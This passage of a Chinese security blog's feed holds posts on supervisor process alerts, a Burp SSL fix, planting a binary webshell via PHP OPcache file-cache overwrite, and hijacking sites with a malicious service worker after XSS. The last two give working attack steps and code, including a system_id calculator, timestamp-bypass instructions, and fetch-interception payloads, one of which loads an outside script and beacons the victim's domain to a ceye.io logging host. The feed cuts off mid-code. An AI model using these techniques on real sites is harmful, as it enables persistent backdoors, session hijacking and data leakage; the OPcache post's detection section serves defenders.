&apos;进程%s(PID: %s)错误输出，请检查进程状态，错误输出信息: %s.&apos; \</span><br><span class="line">                % (process_name, pid, pdata)</span><br><span class="line">            baojing(msg=msg)</span><br><span class="line">        #echo RESULT</span><br><span class="line">        write_stdout(&apos;RESULT 2\nOK&apos;) # transition from READY to ACKNOWLEDGED</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>其中报警函数可以自行拓展，如利用sendmail发邮件报警，利用微信接口实现微信报警或利用短信接口进行短信报警等。<br>本地测试，将报警函数写为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def baojing(msg=None, data=None):</span><br><span class="line">    # if msg == None and data == None:</span><br><span class="line">    #     return</span><br><span class="line">        with open(&quot;/root/test.txt&quot;,&apos;w&apos;)as f:</span><br><span class="line">                f.write(msg)</span><br></pre></td></tr></table></figure></p><p>kill掉某个supervisor子进程，得到test.txt，内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">进程top(PID: 19285)异常退出，请检查进程状态.</span><br></pre></td></tr></table></figure><p>参考链接：</p><p><a href="http://blog.csdn.net/baidu_zhongce/article/details/49151385" target="_blank" rel="noopener">http://blog.csdn.net/baidu_zhongce/article/details/49151385</a><br>            <a href="http://talk.withme.me/?p=318" target="_blank" rel="noopener">http://talk.withme.me/?p=318</a><br>            <a href="http://lixcto.blog.51cto.com/4834175/1540169/" target="_blank" rel="noopener">http://lixcto.blog.51cto.com/4834175/1540169/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;服务器莫名宕机，没有检查到原因，怀疑某进程占用资源过高导致。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="运维" scheme="https://michaelwayneliu.github.io/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="资源监控" scheme="https://michaelwayneliu.github.io/tags/%E8%B5%84%E6%BA%90%E7%9B%91%E6%8E%A7/"/>
    
      <category term="服务器" scheme="https://michaelwayneliu.github.io/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>opcache那些事</title>
    <link href="https://michaelwayneliu.github.io/2018/01/13/opcache%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <id>https://michaelwayneliu.github.io/2018/01/13/opcache那些事/</id>
    <published>2018-01-13T01:52:53.000Z</published>
    <updated>2018-01-13T02:07:44.546Z</updated>
    
    <content type="html"><![CDATA[<p>在 PHP 7.0 发布之初，就有不少 PHP 开发人员对其性能提升方面非常关注。在引入 OPcache 后，PHP的性能的确有了很大的提升，之后，很多开发人员都开始采用 OPcache 作为 PHP 应用的加速器。OPcache 带来良好性能的同时也带来了新的安全隐患。<br><a id="more"></a><br>在 PHP 7.0 发布之初，就有不少 PHP 开发人员对其性能提升方面非常关注。在引入 OPcache 后，PHP的性能的确有了很大的提升，之后，很多开发人员都开始采用 OPcache 作为 PHP 应用的加速器。OPcache 带来良好性能的同时也带来了新的安全隐患。</p><h3 id="opcache原理"><a href="#opcache原理" class="headerlink" title="opcache原理"></a>opcache原理</h3><p>PHP是一种脚本语言，默认情况下，它会编译任何要求它运行的文件，从编译中获取OPCodes，运行它们并立即将其清除。在生产服务器上，PHP代码在几个请求之间不太可能发生变化，因此，编译步骤将始终读取相同的源代码，从而导致运行完全相同的OPCode。这对于时间和资源来说是一个很大的浪费，因为每一个脚本都会针对每个请求调用PHP编译器。</p><p><img src="/2018/01/13/opcache那些事/php-compile-execute-process.png" alt="image"></p><p>于是大佬设计出了OPCode缓存，每个PHP脚本只编译一次，并将生成的OPCodes缓存到共享内存中，这样PHP-FPM就可以从内存中直接读取OPCodes执行。</p><p><img src="/2018/01/13/opcache那些事/compile-execute.png" alt="image"></p><p>OPCache已经成为官方推荐的OPCode缓存解决方案，并从PHP 5.5.0开始捆绑到PHP源代码中</p><p><img src="/2018/01/13/opcache那些事/cache-optimization-steps.png" alt="image"></p><h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><p>可以针对上传攻击或者是拿到主机权限做修改来进行利用。如果是上传攻击，需要php.ini配置如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[opcache]</span><br><span class="line">zend_extension=opcache.so</span><br><span class="line">opcache.enable=1</span><br><span class="line">opcache.file_cache = /tmp/opcache</span><br><span class="line">opcache.validate_timestamps = 0</span><br><span class="line">opcache.file_cache_only = 1       ; PHP 7&apos;s default is 0</span><br></pre></td></tr></table></figure></p><p>对应解释如下，<a href="http://php.net/manual/zh/opcache.configuration.php" target="_blank" rel="noopener">参考</a></p><table><thead><tr><th>名字</th><th>默认</th><th>可修改范围</th><th>含义</th></tr></thead><tbody><tr><td>opcache.enable</td><td>“1”</td><td>PHP_INI_ALL</td><td>是否启用opcache</td></tr><tr><td>opcache.validate_timestamps</td><td>“1”</td><td>PHP_INI_ALL</td><td>如果置为1，则OPCACHE会自动检测文件的时间戳（检测周期为revalidate_freq),并根据文件的时间戳来更新opcode,如果置为0，则只能手动去重启opcache或重启webserver以使更新后的php文件生效</td><td></td></tr><tr><td>opcache.revalidate_freq</td><td>“1”</td><td>PHP_INI_ALL</td><td>opcache自动检测文件是否更新的周期，单位秒。如果是0，则每次请求时opcache都要进行检测。当validate_timestamps为0时,本指令无效</td></tr><tr><td>opcache.file_cache_only</td><td>“0”</td><td>PHP_INI_SYSTEM</td><td>启用或禁用在共享内存中的 opcode 缓存</td></tr><tr><td>opcache.file_cache</td><td>NULL</td><td>PHP_INI_SYSTEM</td><td>配置二级缓存目录并启用二级缓存。启用二级缓存可以在 SHM内存满了、服务器重启或者重置 SHM 的时候提高性能。 默认值为空字符串 “”，表示禁用基于文件的缓存。</td></tr></tbody></table><p>TIPS:</p><pre><code>PHP总共有4个配置指令作用域：（PHP中的每个指令都有自己的作用域，指令只能在其作用域中修改，不是任何地方都能修改配置指令的）PHP_INI_PERDIR：指令可以在php.ini、httpd.conf或.htaccess文件中修改PHP_INI_SYSTEM：指令可以在php.ini 和 httpd.conf 文件中修改PHP_INI_USER：指令可以在用户脚本中修改PHP_INI_ALL：指令可以在任何地方修改</code></pre><p>所以我们需要的关键条件不能通过ini_set动态更改</p><p>在指定的目录中，OPcache 会存储已编译的 PHP 脚本文件，这些缓存文件被放置在和 Web 目录一致的目录结构中。如，编译后的 /var/www/index.php 文件的缓存会被存储在 /tmp/opcache/[system_id]/var/www/index.php.bin 中。system_id 是当前 PHP 版本号，Zend 扩展版本号以及各个数据类型大小的 MD5 哈希值。计算system_id可以用<a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">这个</a>，如果计算出的system_id值和预期不同，可以参考我改动的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line"># Copyright (c) 2016 GoSecure Inc.</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">from md5 import md5</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 2:</span><br><span class="line">    print sys.argv[0] + &quot; [file|URL]&quot;</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">if (sys.argv[1].startswith(&quot;http&quot;)):</span><br><span class="line">    text = requests.get(sys.argv[1]).text</span><br><span class="line">else:</span><br><span class="line">    with open(sys.argv[1]) as file:</span><br><span class="line">        text = file.read()</span><br><span class="line">        file.close()</span><br><span class="line"></span><br><span class="line"># PHP Version</span><br><span class="line">php_version = re.search(&apos;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;PHP Version &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&apos;, text)</span><br><span class="line"></span><br><span class="line">if php_version == None:</span><br><span class="line">    php_version = re.search(&apos;&lt;h1 class=&quot;p&quot;&gt;PHP Version (.*)&apos;, text)</span><br><span class="line"></span><br><span class="line">if php_version == None:</span><br><span class="line">    print &quot;No PHP version found, is this a phpinfo file?&quot;</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">php_version = php_version.group(1)</span><br><span class="line"></span><br><span class="line"># Zend Extension Build ID</span><br><span class="line">zend_extension_id = re.search(&apos;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Zend Extension Build &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&apos;, text)</span><br><span class="line">if zend_extension_id == None:</span><br><span class="line">    print &quot;No Zend Extension Build found.&quot;</span><br><span class="line">    exit(0)</span><br><span class="line">zend_extension_id = zend_extension_id.group(1)</span><br><span class="line"></span><br><span class="line"># Architecture</span><br><span class="line">architecture = re.search(&apos;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;System &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&apos;, text)</span><br><span class="line">if architecture == None:</span><br><span class="line">    print &quot;No System info found.&quot;</span><br><span class="line">    exit(0)</span><br><span class="line">architecture = architecture.group(1).split()[-1]</span><br><span class="line"></span><br><span class="line"># Zend Bin ID suffix</span><br><span class="line">if architecture == &quot;x86_64&quot;:</span><br><span class="line">    bin_id_suffix = &quot;148888&quot;</span><br><span class="line">else:</span><br><span class="line">    bin_id_suffix = &quot;144444&quot;</span><br><span class="line"></span><br><span class="line">zend_bin_id = &quot;BIN_&quot; + bin_id_suffix</span><br><span class="line"></span><br><span class="line"># Logging</span><br><span class="line">print &quot;PHP version : &quot; + php_version</span><br><span class="line">print &quot;Zend Extension ID : &quot; + zend_extension_id</span><br><span class="line">print &quot;Zend Bin ID : &quot; + zend_bin_id</span><br><span class="line">print &quot;Assuming &quot; + architecture + &quot; architecture&quot;</span><br><span class="line"></span><br><span class="line">digest = md5(php_version + zend_extension_id + zend_bin_id).hexdigest()</span><br><span class="line">print &quot;------------&quot;</span><br><span class="line">print &quot;System ID : &quot; + digest</span><br></pre></td></tr></table></figure><p>如果是上传攻击，需要知道以上的opcache的配置信息(可以是从phpinfo)，需要能上传到opcache.file_cache指定的目录，需要计算出正确的system_id，然后，本地创建一个webshell，生成一个编译后的 webshell 二进制缓存文件，把文件头的system_id改成前面提到的计算出来的目录机器的就行。</p><p><img src="/2018/01/13/opcache那些事/system_id.png" alt="image"></p><p>最后，上传恶意webshell 二进制缓存文件到opcache.file_cache指定的目录，覆盖掉目标机器的正常php文件生成的二进制缓存文件。访问那个原本正常的php文件，getshell</p><p>如果目标机器file_cache_only = 0，内存缓存方式的优先级高于文件缓存，那么重写后的 OPcache 文件（webshell）是不会被执行的。但是，当 Web 服务器重启后，就可以绕过此限制。因为，当服务器重启之后，内存中的缓存为空，此时，OPcache 会使用文件缓存的数据填充内存缓存的数据，这样，webshell 就可以被执行了。还有就是如果对方存在一些常年不会访问到的php文件，就不会存在该文件的内存缓存和文件缓存。比如WordPress 等这类框架里面，有许多过时不用的文件依旧在发布的版本中能够访问，如：registration-functions.php，通过上传 webshell 的二进制缓存文件为 registration-functions.php.bin ，之后请求访问 /wp-includes/registration-functions.php ，此时 OPcache 就会加载我们所上传的 registration-functions.php.bin 缓存文件。</p><p>如果目标机器validate_timestamps = 1，php会按照opcache.revalidate_freq设定的时间间隔定期校验php 源文件的时间戳与对应的缓存文件的时间戳的差别，如果两个时间戳不匹配，缓存文件将被丢弃，并且重新生成一份新的缓存文件。要想绕过此限制，攻击者必须知道目标源文件的时间戳。在比如wordpress等的框架中，有些文件从2012年之后从没有被修改过，如：registration-functions.php 和 registration.php 。知道了时间戳，攻击者就可以绕过 validate_timestamps 限制，成功覆盖缓存文件，执行 webshell。二进制缓存文件的时间戳在 34字节偏移处。</p><p><img src="/2018/01/13/opcache那些事/timestamp.png" alt="image"></p><p>当然如果攻击者能拿到主机权限，攻击者可能会按照上面的配置藏一个opcache后门。一般的基于检测源文件的webshell扫描工具无法扫描出当前php存在后门，如D盾。</p><h3 id="本地检测"><a href="#本地检测" class="headerlink" title="本地检测"></a>本地检测</h3><p>如何知道自己中招没有呢？不是没有办法。使用<a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">这个</a></p><p>其中OPcache Malware Hunter通过比对和现有缓存文件的差异来判断是否发生了任何更改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./opcache_malware_hunt.py</span><br><span class="line">Usage : ./opcache_malware_hunt.py [opcache_folder] [system_id] [php.ini]</span><br></pre></td></tr></table></figure><p><img src="/2018/01/13/opcache那些事/malware_hunter.png" alt="image"><br>OPcache Disassembler用于反编译opcache文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./opcache_disassembler.py</span><br><span class="line">Usage : ./opcache_disassembler.py [-tc] [file]</span><br><span class="line">    -t Print syntax tree</span><br><span class="line">    -c Print pseudocode</span><br></pre></td></tr></table></figure><p>提供了两种显示选项，语法树和伪代码，伪代码更容易理解</p><p>参考链接：<a href="http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/" target="_blank" rel="noopener">http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在 PHP 7.0 发布之初，就有不少 PHP 开发人员对其性能提升方面非常关注。在引入 OPcache 后，PHP的性能的确有了很大的提升，之后，很多开发人员都开始采用 OPcache 作为 PHP 应用的加速器。OPcache 带来良好性能的同时也带来了新的安全隐患。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="PHP" scheme="https://michaelwayneliu.github.io/categories/PHP/"/>
    
    
      <category term="Opcache" scheme="https://michaelwayneliu.github.io/tags/Opcache/"/>
    
      <category term="php" scheme="https://michaelwayneliu.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>burp错误解决</title>
    <link href="https://michaelwayneliu.github.io/2018/01/13/burp%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3/"/>
    <id>https://michaelwayneliu.github.io/2018/01/13/burp错误解决/</id>
    <published>2018-01-13T01:35:29.000Z</published>
    <updated>2018-01-13T01:47:50.332Z</updated>
    
    <content type="html"><![CDATA[<p>burp抓https包出现页面无返回情况<br><a id="more"></a><br>burp抓https包出现页面无返回情况，F12定位资源请求发现某个页面的返回头中X-Frame-Options值设为DENY，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/X-Frame-Options" target="_blank" rel="noopener">参考</a><br>单独请求该资源，得到错误<strong>handshake alert: unrecognized_name</strong>，google之，是SSL在JAVA7中的实现问题，使用如下命令启动burp，解决</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djsse.enableSNIExtension=false -jar burpsuite_pro_v1.X.jar</span><br></pre></td></tr></table></figure><p>这会禁止服务器名称暗示扩展–Server Name Indication (SNI) extension，让JAVA忽略Unrecognized Name这个错误。在user options–&gt;SSL也可以Disable Java SNI extension</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;burp抓https包出现页面无返回情况&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="工具" scheme="https://michaelwayneliu.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Burp" scheme="https://michaelwayneliu.github.io/tags/Burp/"/>
    
      <category term="HTTPS" scheme="https://michaelwayneliu.github.io/tags/HTTPS/"/>
    
      <category term="错误" scheme="https://michaelwayneliu.github.io/tags/%E9%94%99%E8%AF%AF/"/>
    
  </entry>
  
  <entry>
    <title>service worker--xss进化</title>
    <link href="https://michaelwayneliu.github.io/2018/01/12/service-worker-xss%E8%BF%9B%E5%8C%96/"/>
    <id>https://michaelwayneliu.github.io/2018/01/12/service-worker-xss进化/</id>
    <published>2018-01-12T14:19:21.000Z</published>
    <updated>2018-01-12T14:58:42.455Z</updated>
    
    <content type="html"><![CDATA[<p>我们可以用 JS 代码来拦截浏览器当前域的 HTTP 请求，并设置缓存的文件，直接返回，不经过 web 服务器，使目标只要在线就可以被我们控制。可怕的是，即便 xss 漏洞被修复了，攻击仍然持续，并且渗透到攻击范围内的每一个 url。<br><a id="more"></a></p><h2 id="Service-Worker-是什么？"><a href="#Service-Worker-是什么？" class="headerlink" title="Service Worker 是什么？"></a>Service Worker 是什么？</h2><p>一个 service worker 是一段运行在浏览器后台进程里的脚本，它独立于当前页面。在将来，基于它可以实现消息推送，静默更新以及地理围栏等服务，但是目前它首先要具备的功能是拦截和处理网络请求，包括可编程的响应缓存管理。<br>Service Worker是基于Web Worker的事件驱动的，他们执行的机制都是新开一个线程去处理一些额外的任务。对于Web Worker，我们可以使用它来进行复杂的计算，因为它并不阻塞浏览器主线程的渲染。而Service Worker，我们可以用它来进行本地缓存，相当于一个本地的proxy。说起缓存，我们会想起我们常用的一些缓存技术来缓存我们的静态资源，但是老的方式是不支持调试的，灵活性不高。使用Service Worker来进行缓存，我们可以用javascript代码来拦截浏览器的http请求，并设置缓存的文件，直接返回，不经过web服务器。</p><p><img src="/2018/01/12/service-worker-xss进化/SW1.png" alt="image"></p><p>我们可以用 JS 代码来拦截浏览器当前域的 HTTP 请求，并设置缓存的文件，直接返回，不经过 web 服务器，使目标只要在线就可以被我们控制。可怕的是，即便 xss 漏洞被修复了，攻击仍然持续，并且渗透到攻击范围内的每一个 url。<br>由于这项技术能量太大，所以在设计的时候对他做了一定的约束：只在 HTTPS 下工作，安装ServiceWorker的脚本需要当前域下，且返回的 content-type 包含javascript。</p><p>在 worker 线程中，可以获得下列对象</p><ol><li>navigator对象</li><li>location对象，只读</li><li>XMLHttpRequest对象</li><li>setTimeout/setInterval方法</li><li>Application Cache</li><li>通过importScripts()方法加载其他脚本</li><li>创建新的Web Worker</li></ol><p>Worker 线程不能获得下列对象</p><ol><li>DOM对象</li><li>window对象</li><li>document对象</li><li>parent对象</li></ol><p>所以在worker线程中，不能进行dom元素的更新。也就是说在 Worker 的作用域中我们难以完成 XSS 攻击，所以还是得通过劫持 来完成攻击。</p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>攻击需要的点：</p><p>1.注册service worker</p><p>需要一个可以xss的点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (&apos;serviceWorker&apos; in navigator) &#123;  </span><br><span class="line"> navigator.serviceWorker.register(&apos;/hack.js&apos;)</span><br><span class="line"> .then(function(registration) &#123;</span><br><span class="line"> console.log(&apos;ServiceWorker registration successful with scope: &apos;, registration.scope);</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>在这个例子中，service worker文件被放在这个域的根目录下，这意味着service worker和网站同源。换句话说，这个service work将会收到这个域下的所有fetch事件。如果我将service worker文件注册为/example/hack.js，那么，service worker只能收到/example/路径下的fetch事件（例如： /example/page1/, /example/page2/）。</p><p>2.hack.js可以是上传到网站的js文件，也可以是一个jsonp的接口。hack.js的内容如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">this.addEventListener(&apos;fetch&apos;, function(event) &#123;</span><br><span class="line">   event.respondWith(new Response(&quot;</span><br><span class="line">&lt;h1&gt; Intercepted!&lt;/h1&gt;</span><br><span class="line">&quot;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>试图拦截请求，重定向到给定url，失败<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(&apos;fetch&apos;, function (event) &#123;  </span><br><span class="line"> event.respondWith(</span><br><span class="line"> caches.match(event.request).then(function(res)&#123;</span><br><span class="line"> if(res)&#123;//如果有缓存则使用缓存</span><br><span class="line"> return res;</span><br><span class="line"> &#125;</span><br><span class="line"> return requestBackend(event);//没缓存就进行缓存</span><br><span class="line"> &#125;)</span><br><span class="line"> )</span><br><span class="line">&#125;);</span><br><span class="line">function requestBackend(event)&#123;  </span><br><span class="line">var url = event.request.clone();  </span><br><span class="line"> if(url.url==&apos;http://127.0.0.1/aaa.html&apos;)&#123;//判断是否为需要劫持的资源</span><br><span class="line">url.url=&apos;//html5sec.org/test.js&apos;;  </span><br><span class="line"> &#125;</span><br><span class="line"> return fetch(url).then(function(res)&#123;</span><br><span class="line"> //检测是否为有效响应</span><br><span class="line"> if(!res || res.status !== 200 || res.type !== &apos;basic&apos;)&#123;</span><br><span class="line"> return res;</span><br><span class="line"> &#125;</span><br><span class="line"> var response = res.clone();</span><br><span class="line"> caches.open(&apos;v1&apos;).then(function(cache)&#123;</span><br><span class="line"> cache.put(event.request, response);</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line"> return res;</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>原因是request.url是只读的<br><img src="/2018/01/12/service-worker-xss进化/request_url只读.png" alt="image"></p><p>拦截针对某个url的请求，返回特定内容，成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(&apos;fetch&apos;, function (event) &#123;  </span><br><span class="line"> event.respondWith(</span><br><span class="line"> //console.log(event.request)</span><br><span class="line"> caches.match(event.request).then(function(res)&#123;</span><br><span class="line"> if(res)&#123;//如果有缓存则使用缓存</span><br><span class="line"> return res;</span><br><span class="line"> &#125;</span><br><span class="line"> return requestBackend(event);//没缓存就进行缓存</span><br><span class="line"> &#125;)</span><br><span class="line"> )</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function requestBackend(event)&#123;  </span><br><span class="line">var url = event.request.clone();  </span><br><span class="line">console.log(url)</span><br><span class="line"> if(url.url==&apos;http://127.0.0.1/aaa.html&apos;)&#123;//判断是否为需要劫持的资源</span><br><span class="line"></span><br><span class="line">  return new Response(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;, &#123;headers: &#123; &apos;Content-Type&apos;: &apos;text/html&apos; &#125;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  return fetch(url).then(function(res)&#123;</span><br><span class="line"> //检测是否为有效响应</span><br><span class="line"> if(!res || res.status !== 200 || res.type !== &apos;basic&apos;)&#123;</span><br><span class="line"> return res;</span><br><span class="line"> &#125;</span><br><span class="line"> var response = res.clone();</span><br><span class="line"> caches.open(&apos;v1&apos;).then(function(cache)&#123;</span><br><span class="line"> cache.put(event.request, response);</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line"> return res;</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>具体的攻击过程：</p><p>一开始未被攻击的aaa.html正常显示。<br><img src="/2018/01/12/service-worker-xss进化/aaa正常显示.png" alt="image"></p><p>用户访问存在xss的页面hijack.html。注册上传到网站的1.js。</p><p><img src="/2018/01/12/service-worker-xss进化/1.js.png" alt="image"><br>或是利用存在jsonp注入的url进行注册。<br><img src="/2018/01/12/service-worker-xss进化/jsonp接口.png" alt="image"><br>此时再访问aaa.html就如图了。重启浏览器依然如此。访问其他页面可以正常访问。<br><img src="/2018/01/12/service-worker-xss进化/中招后.png" alt="image"></p><p>service worker只支持https的页面。在github测试成功。<br><img src="/2018/01/12/service-worker-xss进化/github测试.png" alt="image"></p><h2 id="继续玩"><a href="#继续玩" class="headerlink" title="继续玩"></a>继续玩</h2><p>如何实现一个SW远控<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(&apos;fetch&apos;, function (event) &#123;  </span><br><span class="line"> event.respondWith(</span><br><span class="line"> //console.log(event.request)</span><br><span class="line"> caches.match(event.request).then(function(res)&#123;</span><br><span class="line"> if(res)&#123;//如果有缓存则使用缓存</span><br><span class="line"> return res;</span><br><span class="line"> &#125;</span><br><span class="line"> return requestBackend(event);//没缓存就进行缓存</span><br><span class="line"> &#125;)</span><br><span class="line"> )</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function requestBackend(event)&#123;  </span><br><span class="line">var url = event.request.clone();  </span><br><span class="line">console.log(url)</span><br><span class="line"> if(url.url==&apos;http://127.0.0.1/aaa.php&apos;)&#123;//判断是否为需要劫持的资源</span><br><span class="line">  // importScripts(&apos;3.js&apos;);</span><br><span class="line">  return new Response(&quot;&lt;div id=&apos;div1&apos;&gt;&lt;p id=&apos;p1&apos;&gt;这是一个段落&lt;/p&gt;&lt;p id=&apos;p2&apos;&gt;这是另一个段落&lt;/p&gt;&lt;/div&gt;&lt;script src=&apos;http://127.0.0.1/3.js&apos;&gt;&lt;/script&gt;&lt;script src=&apos;http://html5sec.org/test.js&apos;&gt;var head = document.getElementsByTagName(&apos;head&apos;)[0];var ele=document.createElement(&apos;script&apos;);ele.src = &apos;http://&apos;+document.domain+&apos;.pxmnr7.ceye.io&apos;;head.appendChild(ele);&lt;/script&gt;&quot;, &#123;headers: &#123; &apos;Content-Type&apos;: &apos;text/html&apos; &#125;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  return fetch(url).then(function(res)&#123;</span><br><span class="line"> //检测是否为有效响应</span><br><span class="line"> if(!res || res.status !== 200 || res.type !== &apos;basic&apos;)&#123;</span><br><span class="line"> return res;</span><br><span class="line"> &#125;</span><br><span class="line"> var response = res.clone();</span><br><span class="line"> caches.open(&apos;v1&apos;).then(function(cache)&#123;</span><br><span class="line"> cache.put(event.request, response);</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line"> return res;</span><br><span class="line"> &#125;)</span><br><span 